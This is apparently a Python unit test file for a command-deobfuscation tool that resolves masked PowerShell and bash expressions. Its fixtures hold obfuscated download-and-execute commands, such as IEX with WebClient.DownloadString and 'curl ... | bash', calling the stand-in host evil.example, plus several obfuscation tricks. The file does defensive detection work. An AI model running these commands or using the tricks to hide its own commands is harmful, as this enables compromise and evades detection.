import base64
import unittest

from cmd_unmask import unmask_command
from cmd_unmask.resolver import resolve_expressions


class TestStaticExpressionResolver(unittest.TestCase):
    def test_string_concatenation_and_paren_unwrapping(self) -> None:
        raw = "('pow' + \"ersh\" + 'ell') (-c) ('Write-' + 'Host')"
        res = resolve_expressions(raw)
        self.assertIn("powershell", res)
        self.assertIn("Write-Host", res)

    def test_format_operator_case_insensitive(self) -> None:
        raw = "(\"{1}{0}{2}\" -F 'er','pow','shell') ('{1}{0}' -f 'EX','I')"
        res = resolve_expressions(raw)
        self.assertIn("powershell", res)
        self.assertIn("IEX", res)

    def test_char_casts_and_joins_case_insensitive(self) -> None:
        raw1 = "[ChAr]105 + [cHaR]0x65 + [char]120"
        self.assertIn("iex", resolve_expressions(raw1))

        raw2 = "[cHaR[]](105, 101, 120) -JoIn ''"
        self.assertIn("iex", resolve_expressions(raw2))

        raw3 = "[StRiNg]::Join('', ('I', 'E', 'X'))"
        self.assertIn("IEX", resolve_expressions(raw3))

    def test_replace_case_sensitivity_semantics(self) -> None:
        # .Replace is case-sensitive in .NET
        raw_dot = "'pXwershell'.Replace('X', 'o').Replace('x', 'BAD')"
        res_dot = resolve_expressions(raw_dot)
        self.assertIn("powershell", res_dot)
        self.assertNotIn("BAD", res_dot)

        # -replace is case-insensitive in PowerShell
        raw_op = "'pXwershell' -RePlAcE 'x', 'o'"
        res_op = resolve_expressions(raw_op)
        self.assertIn("powershell", res_op)

    def test_dotnet_frombase64_and_encoding_getstring(self) -> None:
        b64_utf8 = base64.b64encode(
            b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
        ).decode("ascii")
        raw = f"[SyStEm.TeXt.EnCoDiNg]::UTF8.GetString([SyStEm.CoNvErT]::FromBase64String('{b64_utf8}'))"
        res = resolve_expressions(raw)
        self.assertIn("http://evil.example/a.ps1", res)

        b64_uni = base64.b64encode("Write-Output secret".encode("utf-16le")).decode("ascii")
        raw_uni = f"[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64_uni}'))"
        self.assertIn("Write-Output secret", resolve_expressions(raw_uni))

    def test_constant_propagation_and_string_reversal(self) -> None:
        raw = "$a = 'IEX'; $b = 'http://evil.example/stage.ps1'; &$a $b"
        res = resolve_expressions(raw)
        self.assertIn("IEX http://evil.example/stage.ps1", res)

        raw_rev = "$x = 'llehsrewop'; [array]::Reverse($x); $x -join ''"
        res_rev = resolve_expressions(raw_rev)
        self.assertIn("powershell", res_rev)

    def test_bash_ansi_c_and_parameter_expansion_and_pipes(self) -> None:
        raw_ansi = "$'\x63\x75\x72\x6c' $'\150\164\164\160'"
        res_ansi = resolve_expressions(raw_ansi)
        self.assertIn("curl", res_ansi)
        self.assertIn("http", res_ansi)

        raw_param = "cmd='cXrX'; ${cmd//X/u}"
        res_param = resolve_expressions(raw_param)
        self.assertIn("curu", res_param)

        b64_bash = base64.b64encode(b"curl -s http://evil.example/sh | bash").decode("ascii")
        raw_pipe = f"echo '{b64_bash}' | base64 -d | bash"
        res_pipe = resolve_expressions(raw_pipe)
        self.assertIn("curl -s http://evil.example/sh", res_pipe)

        raw_rev_pipe = "echo 'hsab | hs/elpmaxe.live//:ptth' | rev"
        self.assertIn("http://evil.example/sh | bash", resolve_expressions(raw_rev_pipe))

        raw_tr_pipe = "echo 'hXXp://evil.example' | tr 'X' 't'"
        self.assertIn("http://evil.example", resolve_expressions(raw_tr_pipe))

    def test_unmask_command_records_expression_resolver_in_provenance(self) -> None:
        raw = "I`E`X (\"{1}{0}\" -f 'Client','Net.Web')"
        verdict = unmask_command(raw)
        self.assertIn("Net.WebClient", verdict.primary_unmasked_payload)
        techniques = [step.technique for step in verdict.provenance_chain]
        self.assertIn("shell_normalizer", techniques)
        self.assertIn("expression_resolver", techniques)


if __name__ == "__main__":
    unittest.main()
